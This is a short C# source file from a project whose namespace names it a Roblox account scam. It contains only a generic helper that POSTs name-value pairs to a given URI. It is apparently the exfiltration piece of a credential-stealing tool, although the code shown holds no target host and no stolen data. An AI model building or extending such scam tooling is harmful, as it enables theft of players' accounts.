using System.Collections.Specialized;
using System.Net;

namespace roblox_account_scam
{
    class send
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            byte[] result = null;
            using (WebClient webClient = new WebClient())
            {
                result = webClient.UploadValues(uri, pairs);
                webClient.Dispose();
            }
            return result;

        }
    }
}